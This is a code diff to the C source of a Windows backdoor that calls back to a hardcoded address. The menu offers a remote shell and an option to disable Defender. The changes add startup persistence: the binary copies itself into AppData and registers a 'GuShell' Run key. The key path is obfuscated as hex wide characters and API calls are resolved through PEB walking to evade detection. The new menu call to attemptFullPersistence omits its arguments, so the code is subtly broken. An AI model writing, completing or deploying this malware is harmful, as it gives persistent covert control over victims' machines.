@@ -8,13 +8,19 @@
 #include <process.h>
 #include <sys/types.h>
 #include <winnt.h>
+#include <ShlObj.h>
+#include <string.h>
 
 #define LOCALTEST
 
 #define PORT "3000"
 
+#define DEBUG_CLIENT
+
 // #define _M_X64 // for peb
 #define DO_SPECIAL_PEB_FIND
+
+#define GO_FOR_THROAT
 
 #ifdef LOCALTEST
 #define ADDRESS "192.168.1.96"
@@ -99,6 +105,7 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
 
 typedef BOOL(WINAPI* CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef HWND(WINAPI* GETCONSOLEWINDOW)();
+typedef BOOL(WINAPI* MOVEFILEEXW)(LPCWSTR, LPCWSTR, DWORD);
 typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
 typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
 typedef LSTATUS(WINAPI* REGOPENKEYEXW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
@@ -116,6 +123,7 @@ typedef BOOL(WINAPI* SHOWWINDOW)(HWND, int);
 // function pointers from pebwalk
 CREATEPROCESSA pCreateProcessA; // kernel32.dll
 GETCONSOLEWINDOW pGetConsoleWindow; // kernel32.dll
+MOVEFILEEXW pMoveFileExW; // kernel32.dll
 REGOPENKEYEXW pRegOpenKeyExW; // Advapi32.dll
 REGSETVALUEEXW pRegSetValueExW; // Advapi32.dll
 REGCLOSEKEY pRegCloseKey; // Advapi32.dll
@@ -220,6 +228,7 @@ void GetAPIFromPeb() {
 		pLoadLibraryA = (LOADLIBRARYA)GetProcAddressWalk(kernel32baseAddr, "LoadLibraryA");
 		pCreateProcessA = (CREATEPROCESSA)GetProcAddressWalk(kernel32baseAddr, "CreateProcessA");
 		pGetConsoleWindow = (GETCONSOLEWINDOW)GetProcAddressWalk(kernel32baseAddr, "GetConsoleWindow");
+		pMoveFileExW = (MOVEFILEEXW)GetProcAddressWalk(kernel32baseAddr, "MoveFileExW");
 
 		if(advapi32Base == NULL) advapi32Base = pLoadLibraryA("Advapi32.dll");
 
@@ -336,8 +345,8 @@ void attemptDefeatDefender(SOCKET* pSockfd) {
 }
 
 //Attempts to add autostart to both the local machine and current user keys
-void attemptRegistryPersistence(SOCKET* pSockfd) {
-	TCHAR dirName[100];
+void attemptRegistryPersistence(SOCKET* pSockfd, TCHAR* dirName) {
+	
 	DWORD charsWritten;
 	HKEY key;
 	LSTATUS rv;
@@ -347,15 +356,6 @@ void attemptRegistryPersistence(SOCKET* pSockfd) {
 
 	char failedUser[] = "Failed to add value to system registry tree, failed persistence.\n";
 	char gotUser[] = "Success with User Key!\n";
-	
-	// oh my god. I cannot explain how much I hate this function. This line.
-	// I have spent two hours trying to figure out why it was able to print the directory but failed to
-	// go to the registry, infact it showed up in the registry in chinese. It took me TWO HOURS to realize
-	// (after looking at the raw binary of a correct registry entry), that the registry uses 2 byte wide characters.
-	// I was using GetModuleFileNameA, which as the name clearly states DOES NOT OUTPUT WIDE CHARACTERS.
-	GetModuleFileNameW(NULL, dirName, 100);
-
-	//printf(dirName); <--- so that I remember the pain, THIS PRINTS CHARS!!! THATS WHY IT WORKED!!! THEY'RE NOT WIDE!!!
 
 	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x005c, 0x0043, 0x0075, 0x0072, 0x0072, 0x0065, 0x006e, 0x0074, 0x0056, 0x0065, 0x0072, 0x0073, 0x0069, 0x006f, 0x006e, 0x005c, 0x0052, 0x0075, 0x006e, 0x0000 };
 	
@@ -399,6 +399,86 @@ void attemptRegistryPersistence(SOCKET* pSockfd) {
 	return;
 }
 
+void attemptFullPersistence(SOCKET* pSockfd, TCHAR* dirName) {
+
+	// Get name of file
+	wchar_t* name;
+	TCHAR wszPath[MAX_PATH] = L"";
+	char succ[] = "Moved file to AppData!\n";
+	char failed[] = "Failed to move file!\n";
+
+	// Get name of program
+	name = wcsrchr(dirName, L'\\');
+
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
+
+	wcscat(wszPath, name);
+
+	if (pMoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
+		pSend(*pSockfd, failed, sizeof failed, 0);
+		return;
+	}
+
+	pSend(*pSockfd, succ, sizeof succ, 0);
+
+	memcpy(dirName, wszPath, sizeof wszPath);
+
+	attemptRegistryPersistence(pSockfd, dirName);
+	
+}
+
+// ATTEMPT FULL BUT WITH NO NETWORK!!! IMPORTANT.
+
+void attemptFullPersistenceNoNetwork(TCHAR* dirName) {
+	// Get name of file
+	wchar_t* name;
+	name = wcsrchr(dirName, L'\\');
+	// Construct new hidey hole spot
+
+	TCHAR wszPath[MAX_PATH] = L"";
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
+
+	wcscat(wszPath, name);
+
+	if (pMoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
+		return;
+	}
+	
+	memcpy(dirName, wszPath, sizeof wszPath);
+
+	DWORD charsWritten;
+	HKEY key;
+	LSTATUS rv;
+
+	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x005c, 0x0043, 0x0075, 0x0072, 0x0072, 0x0065, 0x006e, 0x0074, 0x0056, 0x0065, 0x0072, 0x0073, 0x0069, 0x006f, 0x006e, 0x005c, 0x0052, 0x0075, 0x006e, 0x0000 };
+
+	rv = pRegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key);
+
+	if (rv == ERROR_SUCCESS) {
+		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
+		if (pRegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
+			pRegCloseKey(key);
+		}
+		else {
+			pRegCloseKey(key);
+			return;
+		}
+	}
+
+	// Now attempt user.
+	rv = pRegOpenKeyExW(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &key);
+
+	if (rv == ERROR_SUCCESS) {
+		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
+		pRegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR));
+			
+	}
+
+	RegCloseKey(key);
+
+	return;
+}
+
 // Cleaning up some stuff
 void cleanManagerInput(char* command, size_t size) {
 
@@ -427,11 +507,18 @@ int main(int argc, char* argv[]) {
 	}
 
 	SOCKET sockfd;
+	TCHAR* dirName = (TCHAR*)malloc(MAX_PATH * sizeof(TCHAR));
+	GetModuleFileNameW(NULL, dirName, 100);
+
+#ifdef GO_FOR_THROAT
+	attemptFullPersistenceNoNetwork(dirName);
+#endif
 
 	char commandList[] =
 		"1. Drop into a shell\n"
 		"2. Attempt to stop defender\n"
-		"3. Attempt registry persistence.\n";
+		"3. Attempt registry persistence.\n"
+		"4. Attempt full persistence with files and reg.\n";
 
 	char commandOpt[50];
 
@@ -461,7 +548,12 @@ int main(int argc, char* argv[]) {
 		}
 
 		if (strcmp(commandOpt, "3") == 0) {
-			attemptRegistryPersistence(&sockfd);
+			attemptRegistryPersistence(&sockfd, dirName);
+			continue;
+		}
+
+		if (strcmp(commandOpt, "4") == 0) {
+			attemptFullPersistence();
 			continue;
 		}
 
